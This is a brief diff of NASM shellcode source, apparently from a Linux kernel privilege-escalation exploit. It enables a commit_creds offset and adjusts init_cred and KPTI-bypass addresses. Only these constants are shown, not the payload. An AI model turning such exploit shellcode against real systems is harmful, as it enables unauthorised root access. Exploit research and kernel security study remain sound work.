@@ -1,10 +1,9 @@
 ; nasm -f bin ./shellcode.S && xxd -i shellcode > shellcode.h
 BITS 64
-  ; commit_creds  equ 0x1097210
+  commit_creds  equ 0x1097210
 
   ; find/g 0xffffffff81000000 , 0xffffffff81800000, 0x1ffffffffff
   init_cred     equ 0x1e39080
-  ; kpti_bypass   equ 0x180021c
   kpti_bypass   equ 0x18001af
 
 _start:
